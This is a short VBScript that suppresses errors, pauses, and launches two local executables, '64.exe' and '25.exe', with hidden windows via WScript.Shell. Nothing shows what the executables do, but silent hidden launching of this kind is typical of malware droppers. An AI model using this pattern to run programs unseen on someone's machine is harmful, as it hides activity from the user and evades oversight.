on error resume next
wscript.sleep 600
set ws=wscript.createobject("wscript.shell")
ws.run "64.exe",0
wscript.sleep 12000
set ws=wscript.createobject("wscript.shell")
ws.run "25.exe",0
